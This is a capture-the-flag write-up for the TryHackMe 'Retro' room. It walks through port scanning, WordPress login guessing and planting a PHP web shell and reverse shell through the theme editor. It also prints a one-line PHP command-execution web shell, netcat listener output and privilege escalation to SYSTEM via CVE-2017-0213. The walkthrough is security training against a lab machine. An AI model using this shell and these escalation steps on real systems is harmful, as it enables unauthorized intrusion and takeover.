# Retro Writeup

They say there are two paths when completing this room. The first path goes as follows:
* Initial Access
* CVE-2019-1388 for SYSTEM

IF the last step doesn't work for you as it didn't for me you may follow a different path for gaining SYSTEM level access.

https://tryhackme.com/room/retro

## Task 1 Pwn

I started out with a simple nmap scan to check out ports, services, and versions.
```
nmap -sC -sV -oA nmap/common 10.10.119.28
```
```
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: RETROWEB
|   NetBIOS_Domain_Name: RETROWEB
|   NetBIOS_Computer_Name: RETROWEB
|   DNS_Domain_Name: RetroWeb
|   DNS_Computer_Name: RetroWeb
|   Product_Version: 10.0.14393
|_  System_Time: 2021-07-26T18:12:10+00:00
```
So I knew we were dealing with a windows machine running an IIS webserver and remote desktop protocol enabled. Then I went to enumerate the web server. First I hit it with fuzzing using gobuster.
```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.204.15
```
```
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.204.15
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/08/01 15:15:21 Starting gobuster in directory enumeration mode
===============================================================
/retro                (Status: 301) [Size: 149] [--> http://10.10.204.15/retro/]
```
This gives us the answer to our first question.

From here I poked around the blog page a bit to gather more information. Doing the prequel box, Blaster, before this one helps tremendously as they are very similiar in the initial exploitation phase. We come across a potential username or password in an early blog post.

![alt text](https://github.com/nickswink/Retro-WriteUp/blob/main/blogpost.PNG?raw=true)

I decided to fuzz for more directories within /retro. I quickly see that this is a wordpress site with all the wp directories.
```
# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.204.15/retro
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.204.15/retro
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/08/01 15:22:41 Starting gobuster in directory enumeration mode
===============================================================
/wp-content           (Status: 301) [Size: 160] [--> http://10.10.204.15/retro/wp-content/]
/wp-includes          (Status: 301) [Size: 161] [--> http://10.10.204.15/retro/wp-includes/
```

So I navigated to `http://10.10.204.15/retro/wp-login.php` to try out these possible credentials. I created a not-so-quick python script to brute force passwords with the username parzival.

I'm not gonna lie this took me WAAY to long to figure out, but wade is the username and the password is the information that we found. After that we are into the wp-admin page.

From prior experience with exploiting wordpress sites I knew I could possibly upload a php reverse shell so I went right to 'Theme Editor' and copied and pasted Pentestmonkey's reverse shell into 'archive.php'. Then I navigated to the location of archives.php in the browser to run the code.

![alt text](https://github.com/nickswink/Retro-WriteUp/blob/main/phppentestmonkey.PNG?raw=true)

Obviously this DOES NOT WORK because the webserver is running on windows not linux.
```
└─# nc -lvnp 4444                                                                      1 ⚙
listening on [any] 4444 ...
connect to [10.6.14.57] from (UNKNOWN) [10.10.204.15] 49891
'uname' is not recognized as an internal or external command,
operable program or batch file.
```




So I swap this shell out with this simple php web shell to see if we can even get RCE. `<?php system($_GET["cmd"]);?>`
Then I navigate back to the location of the archive.php and pass in a parameter for 'cmd'.
![alt text](https://github.com/nickswink/Retro-WriteUp/blob/main/webshell.PNG?raw=true)

Great! Now that I know we have RCE and I can try a full reverse shell. I got mine from [here](https://github.com/Dhayalanb/windows-php-reverse-shell). I just had to change the ip and port. Then make the tmpdir = "C:\\inetpub\\wwwroot\\retro\\wp-content\\themes\\90s-retro". 
* Copy and paste the shell into archive.php
* Scroll down and click 'Upload File'
* Then set up a netcat listener in a terminal
* Navigate to archive.php in the browser just like before.

![alt text](https://github.com/nickswink/Retro-WriteUp/blob/main/reverseshell.PNG?raw=true)

After this I remembered that RDP was enabled and just for the hell of it I tried the same credentials from earlier. SURPRISE they work for RDP. This is better than our reverse shell because we have a real account instead of a service account. We can find user.txt at C:\Users\Wade\Desktop\user.txt

THIS WOULD BE THE POINT IN WHICH YOU SHOULD EXPLORE WHAT THE USER WAS TRYING TO FIX WHICH WAS CVE-2019-1388. IF IT DOES NOT WORK FOR YOU DUE TO A POP UP THEN CONTINUE ON.



![alt text](https://github.com/nickswink/Retro-WriteUp/blob/main/popup.PNG?raw=true)



After enumerating with windows-exploit-suggester.py I tried a few different CVEs for priviledge escalation but no success. The exploit I finally had success with was [CVE-2017-0213](https://github.com/WindowsExploits/Exploits/tree/master/CVE-2017-0213). The CVE is extremely simple to use. You just get the exe file onto the victim  and run it. It will then open up a shell running as SYSTEM.

![alt text](https://github.com/nickswink/Retro-WriteUp/blob/main/root.PNG?raw=true)

Then we can read root.txt at C:\Users\Administrator\Desktop\root.txt.txt

